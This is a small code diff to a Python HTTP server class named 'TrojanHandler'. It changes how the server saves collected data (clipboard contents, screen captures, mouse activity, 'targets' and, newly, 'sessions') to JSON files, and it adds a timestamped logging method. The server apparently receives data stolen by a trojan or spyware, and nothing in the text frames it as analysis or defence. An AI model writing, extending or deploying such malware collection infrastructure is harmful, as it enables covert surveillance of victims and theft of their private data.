@@ -253,7 +253,7 @@ class TrojanHandler(http.server.BaseHTTPRequestHandler):
                 json.dump(data_store["clipboard"], f, indent=2)
         
         if data_store["screen"]:
-            with open("data/screens.json", "w") as f:
+            with open("data/screen.json", "w") as f:
                 json.dump(data_store["screen"], f, indent=2)
         
         if data_store["mouse"]:
@@ -283,6 +283,13 @@ class TrojanHandler(http.server.BaseHTTPRequestHandler):
         if data_store["targets"]:
             with open("data/targets.json", "w") as f:
                 json.dump(data_store["targets"], f, indent=2)
+        
+        if data_store["sessions"]:
+            with open("data/sessions.json", "w") as f:
+                json.dump(data_store["sessions"], f, indent=2)
+    
+    def log_message(self, format, *args):
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")
 
 if __name__ == "__main__":
     PORT = int(os.environ.get("PORT", 9000))
